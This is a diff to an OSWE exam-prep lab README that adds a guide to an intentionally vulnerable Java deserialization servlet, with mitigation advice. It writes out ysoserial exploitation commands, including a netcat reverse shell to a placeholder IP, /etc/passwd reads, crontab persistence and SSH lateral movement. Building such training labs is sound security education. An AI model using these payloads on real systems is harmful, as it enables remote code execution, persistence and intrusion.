@@ -1,6 +1,6 @@
 # OSWE_LAB_PREP_CUSTOM_LABS_BUILT_TO_ACE_OSWE_EXAM
 OSWE CUSTOM LABS AND PREPARATION MASTER GUIDE
-# Topic:php type juggling custom lab for OSWE
+# Topic: php type juggling custom lab for OSWE
 # 🐧 LAMPP (Linux)
 
 1. **Start LAMPP**
@@ -309,3 +309,225 @@ This lab is for **educational purposes only**. Use only in controlled environmen
 ---
 
 **Happy hacking and learning SQL Injection! 🔍💻**
+
+
+# Topic : Java Deserialization RCE Lab
+
+## 📋 Overview
+A deliberately vulnerable Java web application demonstrating insecure deserialization attacks leading to Remote Code Execution (RCE). This lab showcases the classic Java deserialization vulnerability using Apache Commons Collections 3.1, similar to the vulnerability that affected many enterprise applications.
+
+## ⚠️ Warning
+**FOR EDUCATIONAL PURPOSES ONLY**  
+This lab contains intentionally vulnerable code. Do not deploy in production environments or expose to untrusted networks.
+
+## 🎯 Learning Objectives
+- Understand Java serialization/deserialization mechanisms
+- Learn about gadget chains in deserialization attacks
+- Practice exploiting insecure deserialization vulnerabilities
+- Develop and test payloads using ysoserial
+- Implement proper input validation and secure deserialization practices
+
+## 🏗️ Architecture
+The lab consists of a simple Java Servlet that accepts serialized Java objects via HTTP POST and deserializes them without validation. The application uses Apache Commons Collections 3.1, which contains dangerous transformer chains that can be exploited for RCE.
+
+### Vulnerable Component: `VulnerableServlet.java`
+```java
+// Critical vulnerability in doPost() method:
+ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+Object object = objectInputStream.readObject(); // UNSAFE DESERIALIZATION
+```
+
+## 📁 Project Structure
+```
+deserlab/
+├── src/main/java/com/example/VulnerableServlet.java
+├── src/main/webapp/WEB-INF/web.xml
+└── pom.xml
+```
+
+## 🚀 Setup & Installation
+
+### Prerequisites
+- Java 8 JDK
+- Apache Maven 3.6+
+- Python 3.8+ (for exploit scripts)
+
+### Building the Application
+```bash
+cd deserlab
+mvn clean package
+```
+
+### Running the Vulnerable Server
+```bash
+# Start the Jetty embedded server
+mvn jetty:run
+
+# Application will be available at:
+# http://localhost:8080/api/v1/ingest
+```
+
+## 🔍 Vulnerability Details
+
+### The Flaw
+The servlet's `doPost()` method blindly deserializes any Java object sent in the HTTP request body. When combined with Apache Commons Collections 3.1's transformer chains, this allows attackers to construct malicious serialized objects that execute arbitrary commands during deserialization.
+
+### Technical Details
+- **Vulnerable Method**: `ObjectInputStream.readObject()`
+- **Dangerous Library**: Apache Commons Collections 3.1
+- **Gadget Chains**: CommonsCollections1, CommonsCollections5, etc.
+- **Attack Vector**: HTTP POST with serialized Java object in body
+- **Impact**: Remote Code Execution as the server user
+
+## ⚔️ Exploitation
+
+### Tools Required
+- [ysoserial](https://github.com/frohoff/ysoserial) - Payload generation tool
+- Netcat - For reverse shell connections
+- Python with requests library
+
+### Basic Exploitation Steps
+
+1. **Start the vulnerable server:**
+   ```bash
+   cd deserlab
+   mvn jetty:run
+   ```
+
+2. **Generate a malicious payload:**
+   ```bash
+   java -jar ysoserial.jar CommonsCollections5 "touch /tmp/pwned" > payload.bin
+   ```
+
+3. **Send the exploit:**
+   ```bash
+   curl -X POST http://localhost:8080/api/v1/ingest \
+        --data-binary @payload.bin \
+        -H "Content-Type: application/octet-stream"
+   ```
+
+### Reverse Shell Exploitation
+
+1. **Start a listener:**
+   ```bash
+   nc -nlvp 9003
+   ```
+
+2. **Generate and send reverse shell payload:**
+   ```bash
+   java -jar ysoserial.jar CommonsCollections5 "nc -e /bin/bash YOUR_IP 9003" > revshell.bin
+   
+   curl -X POST http://localhost:8080/api/v1/ingest \
+        --data-binary @revshell.bin \
+        -H "Content-Type: application/octet-stream"
+   ```
+
+3. **Or use the provided Python exploit script:**
+   ```bash
+   python3 deserialize.py http://localhost:8080/api/v1/ingest YOUR_IP 9003
+   ```
+
+## 🛡️ Mitigation Strategies
+
+### Immediate Fixes
+1. **Use Safe Alternatives:**
+   - Implement look-ahead deserialization
+   - Use `ObjectInputFilter` (Java 9+)
+   - Validate serialized objects before deserialization
+
+2. **Library Updates:**
+   - Upgrade to Apache Commons Collections 4.0+
+   - Apply security patches
+
+3. **Input Validation:**
+   - Implement allow-list for expected classes
+   - Use signed serialized objects
+
+### Secure Coding Practices
+- Never deserialize untrusted data
+- Use alternative data formats (JSON, XML, Protobuf)
+- Implement proper class filtering
+- Use the principle of least privilege for server execution
+
+## 🧪 Testing Different Gadget Chains
+
+The lab supports multiple gadget chains. Test which ones work with:
+
+```bash
+# Test various chains
+for chain in CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7; do
+    echo "Testing $chain..."
+    java -jar ysoserial.jar $chain "touch /tmp/test_$chain" > payload.bin
+    curl -X POST http://localhost:8080/api/v1/ingest --data-binary @payload.bin -H "Content-Type: application/octet-stream"
+done
+```
+
+## 📊 Impact Assessment
+
+| Aspect | Impact Level |
+|--------|--------------|
+| Confidentiality | High - Can read arbitrary files |
+| Integrity | High - Can modify/delete files |
+| Availability | Medium - Can crash the server |
+| Privilege Escalation | Depends on server user privileges |
+
+## 🔧 Advanced Exploitation Techniques
+
+### Chained Exploits
+1. **Information Gathering:**
+   ```bash
+   java -jar ysoserial.jar CommonsCollections5 "cat /etc/passwd" > info.bin
+   ```
+
+2. **Persistence:**
+   ```bash
+   java -jar ysoserial.jar CommonsCollections5 "echo 'malicious_cron' >> /etc/crontab" > persist.bin
+   ```
+
+3. **Lateral Movement:**
+   ```bash
+   java -jar ysoserial.jar CommonsCollections5 "ssh user@internal_host" > lateral.bin
+   ```
+
+### Bypass Techniques
+- Obfuscating payloads
+- Using alternative encoding
+- Chaining multiple gadget chains
+- Exploiting different library versions
+
+## 🎓 Educational Value
+
+This lab helps understand:
+- The danger of blind deserialization
+- How gadget chains work in Java
+- The importance of input validation
+- Real-world exploitation techniques
+- Proper mitigation strategies
+
+## 📚 References & Resources
+
+### Further Reading
+- [Oracle Secure Coding Guidelines for Java](https://www.oracle.com/java/technologies/javase/seccodeguide.html)
+- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
+- [Apache Commons Collections Security](https://commons.apache.org/proper/commons-collections/security-reports.html)
+
+### Related CVEs
+- CVE-2015-4852 - Apache Commons Collections RCE
+- CVE-2016-8735 - Java Deserialization RCE
+- Multiple vendor-specific deserialization vulnerabilities
+
+## 🤝 Contributing
+
+Found an issue or have an improvement? Please open an issue or submit a pull request following the project's contribution guidelines.
+
+## 📄 License
+
+This project is licensed for educational use only. See LICENSE file for details.
+
+## ⚠️ Disclaimer
+
+This software is provided for educational purposes only. The authors are not responsible for any misuse or damage caused by this program. Use responsibly and only on systems you own or have permission to test.
+
+---
+
+**Remember:** Always practice ethical hacking. Only test systems you own or have explicit permission to test.
